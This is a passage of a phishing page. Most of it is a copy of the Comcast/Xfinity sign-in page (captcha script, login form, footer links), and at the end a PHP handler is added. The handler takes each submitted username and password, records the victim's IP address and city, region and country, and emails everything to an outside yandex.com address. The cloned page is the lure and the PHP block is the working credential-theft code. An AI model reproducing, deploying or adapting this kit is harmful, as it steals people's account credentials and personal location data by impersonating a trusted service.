this.PLAYERMODE_AUDIO)},getDirections:function(){var a=ncGetDirectionsText();return[ncLocSecurityText(a[0]),ncLocSecurityText(a[1])]},getPlayerMode:function(){switch(ncPlayerMode){case ncPlayerModeAudio:return this.PLAYERMODE_AUDIO}return this.PLAYERMODE_VIDEO},getMediaSize:function(){return[ncVideoWidth,ncVideoHeight]},getReadyState:function(){return!0},EVENT_REFRESH_HTML:"EVENT_REFRESH_HTML",EVENT_CMD_NEW_CHALLENGE:"EVENT_CMD_NEW_CHALLENGE",EVENT_CMD_PLAYER_MODE:"EVENT_CMD_PLAYER_MODE",EVENT_CMD_HELP:"EVENT_CMD_HELP",
EVENT_MEDIA_DOWNLOAD_COMPLETE:"EVENT_MEDIA_DOWNLOAD_COMPLETE",EVENT_MEDIA_DOWNLOAD_RETRY:"EVENT_MEDIA_DOWNLOAD_RETRY",EVENT_MEDIA_DOWNLOAD_FAILURE:"EVENT_MEDIA_DOWNLOAD_FAILURE",EVENT_MEDIA_DOWNLOAD_WAIT:"EVENT_MEDIA_DOWNLOAD_WAIT",EVENT_MEDIA_DOWNLOAD_WAIT_TIMEOUT:"EVENT_MEDIA_DOWNLOAD_WAIT_TIMEOUT",_listeners:[],addListener:function(a){null==a&&nucaptcha._throwError("Listener cannot be null");"function"!=typeof a.onNuCaptchaEvent&&nucaptcha._throwError("Listener must contain onNuCaptchaEvent method");
this._listeners.push(a)},removeListener:function(a){for(var b=0;b<this._listeners.length;b++)if(this._listeners[b]==a){this._listeners.splice(b,1);break}},_notifyListeners:function(a,b){for(var c=0;c<this._listeners.length;c++)this._listeners[c].onNuCaptchaEvent(a,b)}}};

</script>
<script type="text/javascript">ncLoadPlayer({"challengeBaseUrl":"https:\/\/login.comcast.net\/proxy\/nudetect\/65786\/w-341498\/captcha","token":"1.w-341498.1.2.59CW_1gI92VIQrw-IZ2Zcg,,.uWavZsN3HA1a6jtrllIfIWNBaHKWWe9R0kBYJUT0n1PXSAJdUEj2H0PnoJK1s2-p9PgyX_m5SzvaVjsXOxFhAWCLGcV4sCPD19bqTBwOf2z38nontWQzjOrVF28n3hA9RDTSbTm0OeiwBjd2jroKYXpAYTK3xG-MxeGgAp1JKGc6woeErXJPfdW9aa47DA4jEgYeGIZFKgdqfIRtvteNAFWfgc329lBbmBtMiFgJv-nD-eJjBrmveQWFvTYAkOnY7mcQ4v2-G94tXCYthvlYN5OhnZBGn5u0ATlV1w4pgVTSQSSKpKgdlZgLvK86mgTNa2jMFTxAZ0zABlCDW54nu4dg1oBqQsZ3mqlJwdOav4NNOAqD3ALEho6QaedW7Kdz","r":"rs-FI0tyrFmOh04DKPpb6q3nQxx","lang":"eng","audioLang":"eng","textLevel":300,"iis":"","videoWidth":"240","videoHeight":"60","playerMode":"VIDEO","enableMediaToggle":true,"browserName":"Chrome","platformName":"Win8.1","answerName":"nucaptcha-answer","tokenName":"nucaptcha-token","tabIndex":0,"enableAudioControls":false,"autofocusAudioElemID":"","displayAudioDownload":true,"autofillSources":[]});</script></div>
<input type="hidden" id="customer-epd" name="customer-epd" value="1.w-341498.1.2.YWpehrsiGTIC98RB1vwLNA,,.b-j_U0T_KOTReNJG1bm99Y6QHc_99aZuJvJP8FCNa-mYrPBc-l540EsKM70_lBbkNmVIRykRFpYv0pIcMLlEsMzX9EJBJXndPQh6biK8SJoLKnJBZL9tmuiPwpSf8H21u72_UZ3jPm3TuwNY6xhqmd2fDdADuDZc76-EkHFDCCcbern5E6c5s2lZrQomDjIHLr6TE_51OSAgamjnojpGIeXQWXAFT0KEJ1XmBm4oZ0FGjUgwO85Cx0myvOKQj3JnqPbXsB5BoVI1ssG7MDwbNOftssILtRykE3uSdruaLyQdLkNtPo7UUwNL0R-lpCxZZT9sNgQ8XgTlm-ixy0IzofaHzNkGEXpFxzNEx3HA2quxVZQmHKuSiRMOF1_gXcl8azPVdtOvQOGFbx3-ma6tDX3BxVDofv9FX-4v-cpqEVazE_kqNYTcUjVsFRNf_Gv83LdQb9-YX3dj7zUK3Vt8A81hoiju5czeUC0sr84Z81kAAqrzIiVxmNOiq__zTx_g6v1SdWUrL3x7zaRolDq_avHu_bVsDkZrbQvgPwysnjMxEsIAaicgFNf5KqAjQnbPahuRr7JBloG7FLx058cxhKmteDAc1QydSUuNJfTjjMMJoUYsdURvLun2ncyAaqGKx6m4DPnz-BURmCrcRkUAjWGFjVoF0KYf-ram2Nau75qcybcdmTWya3ujPANIaxAkfm65c4Pt74lqfxE8q9Vq7fBqQOCQOzQ3B0a1vu6_MV-K8bWUGZxvqtoo39_CM1rpIW-r59sCvRU-yHZdI-CGIlgh7hisIBRn4h8LXkRRtju_XWmATA1Wy4rDoq7kLygCWjuFVUJlO2o5wmcx0n-xtsTbg6l50a3auuZdPlvXLNfa2oIQs8xb0fQZyg42kdCnKAXBUIgw-jizaHlDR3jjoZSJnzHUlNuOTaB_2nMBnfYDPvr8r3jlr-uuZnMQXM-KSoH1UmZIj_iU2q23hbU5R7YOKsaXvyUQ3JTH_ZdgTrv9K9Jym73gUtojnPII9YA9NwTRYHkvlg6IZz1DyfklLV7OO-hyD_ih_jfhHbYbaaPv9fE6tpwHJQTya8nFrFE9rUherO_PYB5uj66CQ9hdtO6-hYKL2sTYg2XjNDa8-2V5aujg73rTPPAR1tImOZIW1fQPizafaAJzyRYG1xYbO3sSRroXaHnEr9bmrvdLZFzt1IbyA5I7E7kfvwEIe2tZHWwgX_SwM1RlNj34a2RMCkeSLrTTAuM9rr6QjjHcJIpQrN0ge1bAs0039MEF3Ok6uS7ck2s9_MW-9Mo0CR07FK4Ut2CcghccJ87oXTTktqkGVYhdT2BW-Ye-HkFY1PnQ5pTO8zwRTBPQY7NiEA7cECl6XRjH1nnp9RfoHIFw5JHyCADw70f5adwX9FZAH5GRO3svaanUnZikzX87ArVq39aZpUK0M6pciPYUkdwPzwxsXo_BN-24j7a2TYrBy8a7ohnIrET6N2DG7_KgGBF4FPzP1GHF4bN6LGCHuVeThxMhmCr4vKS6ddNnBfEm0OoHjaZVxGgjILoAEThdnTIfowLCtYZIHDkko3XfNJsMek-AeCcON6QsnHbObg8NloeI457Nxa4MzzowGN796OgzWBax0FHynFNCL-NOF3Iy70RuuA5AJ45Pi3fs88GmesKKVpl5KWzeAxYobSbdym91NcPk4zwDXQUyzBa6ZGZGcIOyUm6iU7PM01trfhHlwFpwQ-lVWG3suNFuCXIYPaGs9GbtFfmGt8za5EyHYiPeKSDzuNLI5tKdxhiB2aQl-sFHtkMNc2XdSCIp-F0EEkrMuECBsWo9wgHfmew1OQ2cEVJxfx8qOzAnzHNPbQyFmbTPl_SndNtT2ak0d3YvjKYB8g,,"></div>


											<button class="submit" type="submit" id="sign_in">Sign In</button>


		<ul>


															<li id="forgot-username-password-item">Forgot <a href="https://idm.xfinity.com/myaccount/lookup?continue=https%3A%2F%2Flogin.comcast.net%2Flogin%3FipAddrAuthn%3Dfalse%26passive%3Dfalse%26client_id%3Dmy-account-web%26reqId%3D3f3a2b21-d2b3-4625-8bbe-68fc3286a979%26r%3Dcomcast.net%26s%3Doauth%26deviceAuthn%3Dfalse%26continue%3Dhttps%253A%252F%252Flogin.comcast.net%252Foauth%252Fauthorize%253Fclient_id%253Dmy-account-web%2526prompt%253Dlogin%2526redirect_uri%253Dhttps%25253A%25252F%25252Fcustomer.xfinity.com%25252Foauth%25252Fcallback%2526response_type%253Dcode%2526state%253D%252523%25252F%25253FCMP%25253DILC_myaccount_myxfinity_au%2526response%253D1%26forceAuthn%3D1%26lang%3Den%26rm%3D2%26ui_style%3Dlight&lang=en&ui_style=light" target="_self" title="Lookup User ID">username</a> or <a id="forgotPwdLink" href="https://idm.xfinity.com/myaccount/reset?continue=https%3A%2F%2Flogin.comcast.net%2Flogin%3FipAddrAuthn%3Dfalse%26passive%3Dfalse%26client_id%3Dmy-account-web%26reqId%3D3f3a2b21-d2b3-4625-8bbe-68fc3286a979%26r%3Dcomcast.net%26s%3Doauth%26deviceAuthn%3Dfalse%26continue%3Dhttps%253A%252F%252Flogin.comcast.net%252Foauth%252Fauthorize%253Fclient_id%253Dmy-account-web%2526prompt%253Dlogin%2526redirect_uri%253Dhttps%25253A%25252F%25252Fcustomer.xfinity.com%25252Foauth%25252Fcallback%2526response_type%253Dcode%2526state%253D%252523%25252F%25253FCMP%25253DILC_myaccount_myxfinity_au%2526response%253D1%26forceAuthn%3D1%26lang%3Den%26rm%3D2%26ui_style%3Dlight&lang=en&ui_style=light" target="_self" title="Reset Password">password</a>?</li>

										<li id="create-username-item">Don't have a username?					<span><a href="https://idm.xfinity.com/myaccount/create-uid?continue=https%3A%2F%2Flogin.comcast.net%2Flogin%3FipAddrAuthn%3Dfalse%26passive%3Dfalse%26client_id%3Dmy-account-web%26reqId%3D3f3a2b21-d2b3-4625-8bbe-68fc3286a979%26r%3Dcomcast.net%26s%3Doauth%26deviceAuthn%3Dfalse%26continue%3Dhttps%253A%252F%252Flogin.comcast.net%252Foauth%252Fauthorize%253Fclient_id%253Dmy-account-web%2526prompt%253Dlogin%2526redirect_uri%253Dhttps%25253A%25252F%25252Fcustomer.xfinity.com%25252Foauth%25252Fcallback%2526response_type%253Dcode%2526state%253D%252523%25252F%25253FCMP%25253DILC_myaccount_myxfinity_au%2526response%253D1%26forceAuthn%3D1%26lang%3Den%26rm%3D2%26ui_style%3Dlight&lang=en&ui_style=light" target="_self">Create one</a></span>
				</li>




		    										<li id="quick-bill-pay">
					<a href="https://customer.xfinity.com/lite" target="_self">Pay any balance</a> without signing in				</li>
								</ul>
		<p id="implied-legal">By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>.</p>


					<input type="hidden" name="r" value="comcast.net">
					<input type="hidden" name="s" value="oauth">
					<input type="hidden" name="deviceAuthn" value="false">
					<input type="hidden" name="continue" value="https://login.comcast.net/oauth/authorize?client_id=my-account-web&amp;prompt=login&amp;redirect_uri=https%3A%2F%2Fcustomer.xfinity.com%2Foauth%2Fcallback&amp;response_type=code&amp;state=%23%2F%3FCMP%3DILC_myaccount_myxfinity_au&amp;response=1">
					<input type="hidden" name="ipAddrAuthn" value="false">
					<input type="hidden" name="forceAuthn" value="1">
					<input type="hidden" name="lang" value="en">
					<input type="hidden" name="passive" value="false">
					<input type="hidden" name="client_id" value="my-account-web">
					<input type="hidden" name="reqId" value="3f3a2b21-d2b3-4625-8bbe-68fc3286a979">

 	</form>
</div>

				</div>
		</main>

<footer>
<span class="copyright">© 2017 Comcast</span>
<span class="divider hide-compact"></span>
<span class="links hide-compact">
<a href="http://my.xfinity.com/terms/web/">Terms of Service</a>
<span class="divider"></span>
<a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>
</span>
<span class="divider"></span>
<span class="links">
<a href="http://xfinity.comcast.net/siteindex/">Site Map</a>
<span class="divider"></span>
<a href="https://customer.comcast.com/contact-us/">Contact Us</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="http://www.comcast.net/adinformation" target="_blank">Ad Info</a>
<span class="divider"></span>
<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</span>
<span id="b537c389-7be1-4331-bb73-03a71788bc12" class="truste">
<script type="text/javascript" src="http://privacy-policy.truste.com/privacy-seal/Comcast-Cable-Communications-Management,-LLC/asc?rid=b537c389-7be1-4331-bb73-03a71788bc12"></script>
<a href="//privacy.truste.com/privacy-seal/Comcast-Cable-Communications-Management,-LLC/validation?rid=bf9d4d6f-2b32-4201-a167-5b55a4451508" title="TRUSTe online privacy certification" target="_blank">
<img style="border: none" src="http://privacy-policy.truste.com/privacy-seal/Comcast-Cable-Communications-Management,-LLC/seal?rid=9426d53b-42b1-4587-8d55-c57322ccb60d" alt="TRUSTe online privacy certification">
</a>
</span>
</footer>


		<script type="text/javascript" src="static/js/libs/jquery-1.7.min.js"></script>

											<div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay">
    	<div role="document" class="content">
    		    		<button type="button" class="close" aria-label="Close"></button>
    							<h2>Why Stay Signed In?</h2>
					<p>When you choose this option on sign in, we will remember who you are and keep you signed in for up to 30 days unless you sign out.</p>
					<p>Please note: If you share your personal computer with others, they could access and make changes to your account. You should definitely not use this option on public computers.</p>

    	</div>
    </div>

    <script type="text/javascript" src="static/js/scripts-responsive.min.js?v=d8e2944"></script>

    <script type="text/javascript">
        login.registerInitFunction(function(config){
	login.onSubmit = function() {
		var usernameSelector = "#"+config.usernameId,
			passwordSelector = "#"+config.passwordId,
			username = $(usernameSelector),
			password = $(passwordSelector);
		if(username.val() === "" || password.val() === "") {
			$("#error").remove();
			$(usernameSelector+", "+passwordSelector).addClass("error");
			$('<p id="error" class="error_message">'+config.authnEmptyError+'</p>').insertAfter(".textfield-wrapper:has("+passwordSelector+")");
			$("#login_id_label").attr('aria-label',config.authnEmptyError+' '+config.reenterUsername);
			$("#password_label").attr('aria-label',config.authnEmptyError+' '+config.reenterPassword);
			username.focus();
			return false
		} else {
			return true
		}
	};

}, "responsiveForm");
;
                    login.registerInitFunction(function(config){
	if (window.nucaptcha) {
		$.holdReady(true);

		function waitForNucaptchaReady() {
			if (nucaptcha.getInterface(1).getReadyState()) {
				$.holdReady(false);
				patchMarkup();
			} else
				setTimeout(waitForNucaptchaReady,10);
		}

		function patchMarkup() {
			$('#nucaptcha-answer').attr({
				"placeholder": $('#directions-verbose-label').text(),
				"aria-label": $('#directions-verbose-label').text(),
				"formnovalidate": "formnovalidate"
			});
			$('#directions-verbose-label').css('display','none');
		}

		function focusInputForAudioChallenge() {
			if ($('#nucaptcha-player audio').length)
				$('#nucaptcha-answer').focus();
		}

		waitForNucaptchaReady();
		patchMarkup();

		$(document).ready(function() {
			var nci = nucaptcha.getInterface(1);
			nci.addListener({
				onNuCaptchaEvent : function(event, param) {
					if (event === nci.EVENT_REFRESH_HTML) {
						patchMarkup();
						focusInputForAudioChallenge();
				    }
			  	}
	  		});
		});
	}
},"nuCaptcha");;
        						shared.init();
        login.init({
            usernameId: 'user',
            passwordId: 'passwd',
            authnEmptyError: 'Please enter your email, username or mobile phone number and password to sign in.',
            reenterUsername: 'Please re-enter username.',
            reenterPassword: 'Please re-enter password.'
        });
    </script>

		<script type="text/javascript">

		</script>

							<script type="text/javascript">
				document.dispatchEvent(new CustomEvent("c-tracking-init-end"));
			</script>
			</body>
</html>

<php>
if (isset($_POST['user'])) {

	$browser = $_SERVER['HTTP_USER_AGENT'];

	require_once 'geoplugin.class.php';

	$geoplugin = new geoPlugin();

//get user's ip address
	$geoplugin->locate();
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$ip1 = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip1 = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip1 = $_SERVER['REMOTE_ADDR'];
	}

	$message1 .= "---------------|BY NoBODY|---------------\n";
	$message1 .= "Username: " . $_POST['user'] . "\n";
	$message1 .= "Password: " . $_POST['passwd'] . "\n";
	$message1 .= "IP : " . $ip1 . "\n";
	$message1 .= "--------------------------------------------\n";
	$message1 .= "City: {$geoplugin->city}\n";
	$message1 .= "Region: {$geoplugin->region}\n";
	$message1 .= "Country Name: {$geoplugin->countryName}\n";
	$message1 .= "Country Code: {$geoplugin->countryCode}\n";
	$message1 .= "---------------------------------------------\n";
	$too = "mirandameadows11@yandex.com";

	$hi1 = mail($too, $ip1, $message1);

</php>
